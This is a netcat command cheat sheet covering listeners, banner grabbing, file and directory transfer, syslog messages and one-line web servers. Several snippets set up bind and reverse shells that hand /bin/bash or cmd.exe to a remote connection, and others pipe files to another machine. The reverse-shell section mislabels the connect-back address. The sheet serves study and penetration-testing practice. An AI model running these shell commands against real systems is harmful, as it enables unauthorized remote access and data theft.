###### nc
```bash
# Simple usage
# Listener:
$ nc -l -v -p port_number
# Remote:
$ nc listener_IP -p port_number
# UDP
# Listener:
$ nc -ul -v -p port_number
# Remote:
$ nc listener_IP -u port_number
# Banner grabbing
$ nc host_IP 80
HEAD / HTTP/1.0
HEAD / HTTP/1.1
# Copy files between machines
# Method 1:
# Destination:
$ nc -lp 1234 > received_file.txt
# Origin:
$ nc -w 1 destination_ip 1234 < file_to_send
# Method 2:
# Origin:
$ cat file_to_send | nc -lp 1234 (linux)
> type file_to_send | nc -lp 1234 (windows)
# Destination:
$ nc origin_ip 1234 > received_file.txt
# Remote shell
# Target:
$ nc -v -l -p 7777 -e /bin/bash (linux)
> nc -v -l -p 7777 -e cmd.exe (windows)
# Remote:
$ nc target_IP 7777
# Reverse Shell
# Remote:
$ nc -v -l -p 8888
# Target:
$ nc target_IP 8888 -e /bin/bash (linux)
> nc target_IP 8888 -e cmd.exe (windows)
# HTTP Server
$ while true; do nc -l -p 80 -q 1 < index.html; done
# With ‘index.html’ content:
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: netcat!
<!doctype html>
<html>
…
</html>


# Netcat listening on port 567/TCP:
nc -l 567
# Connecting to that port from another machine:
nc 1.2.3.4 5676
# To pipe a text file to the listener:
cat infile | nc 1.2.3.4 567 -q 10
# To have the listener save a received text file:
nc -l -p 567 > textfile
# To transfer a directory, first at the receiving end set up:
nc -l -p 678 | tar xvfpz
# Then send the directory:
tar zcfp - /path/to/directory | nc -w 3 1.2.3.4 678
# To send a message to your syslog server (the <0> means emerg):
echo '<0>message' | nc -w 1 -u syslogger 514
# Setting up a remote shell listener:
nc -v -e '/bin/bash' -l -p 1234 -t
# or
nc l p 1234 e "c:\windows\system32\cmd.exe"
# Then telnet to port 1234 from elsewhere to get the shell.
# Using netcat to make an HTTP request:
echo -e "GET http://www.google.com HTTP/1.0nn" | nc -w 5 www.google.com 80
# Making a one-page webserver; this will feed homepage.txt to all comers:
cat homepage.txt | nc -v -l -p 80
```
